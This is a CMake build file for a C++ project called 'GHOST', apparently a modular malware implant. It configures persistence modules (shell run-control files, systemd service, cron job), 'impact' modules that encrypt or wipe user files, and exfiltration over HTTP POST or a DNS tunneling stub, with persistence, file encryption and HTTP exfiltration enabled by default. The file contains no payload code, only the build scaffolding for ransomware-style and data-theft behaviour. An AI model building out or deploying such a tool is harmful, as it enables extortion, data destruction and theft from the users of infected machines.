cmake_minimum_required(VERSION 3.14)
project(GHOST)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# === OUTPUT CONFIGURATION ===
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)

# === DEPENDENCIES ===
include(FetchContent)
FetchContent_Declare(cpr GIT_REPOSITORY https://github.com/libcpr/cpr.git GIT_TAG 1.14.1)
FetchContent_MakeAvailable(cpr)

# === GLOBAL FLAGS ===
option(ENABLE_DEBUG "Enable verbose logging" OFF)
if(ENABLE_DEBUG)
    add_compile_definitions(DEBUG_MODE)
endif()

# ==========================================
# MODULE: PERSISTENCE
# ==========================================
option(ENABLE_PERSISTENCE "Enable Persistence Manager" ON)
if(ENABLE_PERSISTENCE)
    add_compile_definitions(FEATURE_PERSISTENCE)
    
    option(PERSIST_RUNCONTROL "Method: BashRC/ZshRC" ON)
    option(PERSIST_SERVICE    "Method: Systemd Service" OFF)
    option(PERSIST_CRON       "Method: Cron Job" OFF)

    if(PERSIST_RUNCONTROL)
        add_compile_definitions(METHOD_RUNCONTROL)
        list(APPEND MODULE_SOURCES src/modules/persistence/RunControl.cpp)
    endif()

    if(PERSIST_SERVICE)
        add_compile_definitions(METHOD_SERVICE)
        list(APPEND MODULE_SOURCES src/modules/persistence/Service.cpp)
    endif()

    if(PERSIST_CRON)
        add_compile_definitions(METHOD_CRON)
        list(APPEND MODULE_SOURCES src/modules/persistence/CronJob.cpp)
    endif()
endif()

# ==========================================
# MODULE: IMPACT
# ==========================================
option(ENABLE_IMPACT "Enable Impact Manager" ON)
if(ENABLE_IMPACT)
    add_compile_definitions(FEATURE_IMPACT)

    option(IMPACT_ENCRYPT "Method: Encrypt User Files" ON)
    option(IMPACT_WIPE    "Method: Securely Delete Files" OFF)

    if(IMPACT_ENCRYPT)
        add_compile_definitions(METHOD_ENCRYPT)
        list(APPEND MODULE_SOURCES src/modules/impact/Encryption.cpp)
    endif()

    if(IMPACT_WIPE)
        add_compile_definitions(METHOD_WIPE)
        list(APPEND MODULE_SOURCES src/modules/impact/Wiper.cpp)
    endif()
endif()

# ==========================================
# MODULE: EXFILTRATION
# ==========================================
option(ENABLE_EXFIL "Enable Exfiltration Manager" ON)
if(ENABLE_EXFIL)
    add_compile_definitions(FEATURE_EXFIL)

    option(EXFIL_HTTP "Method: HTTP POST" ON)
    option(EXFIL_DNS  "Method: DNS Tunneling Stub" OFF)

    if(EXFIL_HTTP)
        add_compile_definitions(METHOD_HTTP)
        list(APPEND MODULE_SOURCES src/modules/exfiltration/HttpPost.cpp)
    endif()
endif()

# === TARGET ===
file(GLOB_RECURSE CORE_SOURCES "src/core/*.cpp" "src/utils/*.cpp" "src/network/*.cpp" "src/main.cpp")
list(APPEND CORE_SOURCES src/modules/Persistence.cpp src/modules/Impact.cpp src/modules/Exfiltration.cpp ${MODULE_SOURCES})

add_executable(Ghost ${CORE_SOURCES})
target_link_libraries(Ghost PRIVATE cpr::cpr)
target_include_directories(Ghost PRIVATE include)